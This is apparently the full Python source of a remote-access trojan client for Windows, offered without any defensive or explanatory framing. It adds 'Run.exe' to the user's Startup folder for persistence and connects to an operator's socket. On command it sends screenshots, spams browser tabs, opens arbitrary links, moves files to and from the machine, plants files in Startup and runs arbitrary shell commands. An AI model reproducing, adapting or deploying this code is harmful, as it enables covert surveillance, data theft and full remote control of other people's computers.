import socket
import time
import os
import webbrowser
import getpass
import shutil
import sys
import pickle
import pyautogui
import pathlib
from pathlib import Path
usname = getpass.getuser()
shutil.copy(fr"Run.exe", rf"C:\Users\{usname}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
s = socket.socket()
port = 12345
s.connect(("127.0.0.1", port))
#print("Connected to computer")
scnum = 0
while True:
    x = s.recv(1024).decode("utf-8")
    #print(x)
    if(x == "screenshot"):
        sc = pyautogui.screenshot()
        sc.save("Screenshot0.png")
        picsz = os.stat("Screenshot0.png")
        s.send(str.encode(str(picsz.st_size)))
        picsz = picsz.st_size
        picsz = picsz/1024
        filename="Screenshot0.png"
        f = open(filename,'rb')
        l = f.read(1024)
        yessir = 0
        while(yessir < picsz):
            s.send(l)
            l = f.read(1024)
            yessir = yessir + 1
        f.close()
        os.remove("Screenshot0.png")
    elif(x == "chromespam"):
        chrmx = s.recv(1024).decode("utf-8")
        chrmx = int(chrmx)
        while(chrmx > 0):
            webbrowser.open_new("https://google.com")
            chrmx = chrmx - 1
    elif(x == "anylink"):
        link = s.recv(1024).decode("utf-8")
        webbrowser.open_new(link)
    elif(x == "shell"):
        shcmd = ""
        cwd = ""
        while(shcmd != "disconnect"):
            if(shcmd[:2] == "cd"):
                cdir = shcmd.replace(shcmd[:3], "")
                os.chdir(cdir)
            elif(shcmd == "ls" or shcmd == "dir"):
                ls = os.listdir()
                ls = pickle.dumps(ls)
                s.send(ls)
            elif(shcmd == "help"):
                pass
            elif(shcmd == "download"):
                dfile = s.recv(1024)
                dfile = dfile.decode("utf-8")
                dfilesz = os.stat(rf"{dfile}")
                #print(dfilesz)
                #dfilesz =
                
                s.send(str.encode(str(dfilesz.st_size)))
                dfilesz = dfilesz.st_size
                dfilesz = dfilesz/1024
                filename=rf"{dfile}"
                f = open(filename,'rb')
                l = f.read(1024)
                yessir = 0
                while(yessir < dfilesz):
                    s.send(l)
                    l = f.read(1024)
                    yessir = yessir + 1
                f.close()
                break
            elif(shcmd == "upload"):
                dnfilesz = s.recv(1024).decode("utf-8")
                ############################################
                dnfilesz = int(dnfilesz)
                dfile = s.recv(1024)
                dfile = dfile.decode("utf-8")
                with open(f'{dfile}', 'wb') as f:
                    #print('file opened')
                    dnfilesz = dnfilesz/1024
                    #print(dnfilesz)
                    yessir = 0
                    while (yessir < dnfilesz):
                        data = s.recv(1024)
                        if not data:
                            break
                        f.write(data)
                        yessir = yessir + 1
                    f.close()
                    break
            elif(shcmd == "disconnect"):
                pass
            elif(shcmd == "startup"):
                dnfilesz = s.recv(1024).decode("utf-8")
                ############################################
                dnfilesz = int(dnfilesz)
                dfile = s.recv(1024)
                dfile = dfile.decode("utf-8")
                with open(rf'{dfile}', 'wb') as f:
                    #print('file opened')
                    dnfilesz = dnfilesz/1024
                    #print(dnfilesz)
                    yessir = 0
                    while (yessir < dnfilesz):
                        data = s.recv(1024)
                        if not data:
                            break
                        f.write(data)
                        yessir = yessir + 1
                    f.close()
                    shutil.copy(fr"{dfile}", rf"C:\Users\{usname}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
                    os.remove(dfile)
                    break
            elif(shcmd == "cmd"):
                os.system(s.recv(1024).decode("utf-8"))
                s.send(str.encode("Command done"))
                #print("Sent")
            else:
                pass
            shcmd = ""
            cwd = ""
            cwd = os.getcwd()
            s.send(str.encode(cwd))
            shcmd = s.recv(1024).decode("utf-8")
    else:
        pass
    x = " "
